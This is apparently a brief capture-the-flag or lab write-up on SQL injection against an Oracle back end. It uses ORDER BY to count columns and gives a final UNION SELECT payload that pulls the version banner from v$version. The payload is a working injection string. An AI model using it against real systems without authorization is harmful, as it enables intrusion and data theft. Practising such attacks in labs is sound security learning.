First, try to determine how many columns in the database, I don't know why the `UNION SELECT NULL` query does not work in this challenge, so I decided to use `ORDER BY <1 OR 2...>--`.

After testing, I realize that the database has 2 columns, using this [Oracle Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-default-databases), here's my final input:

```
' UNION SELECT banner, <random string> FROM v$version--
```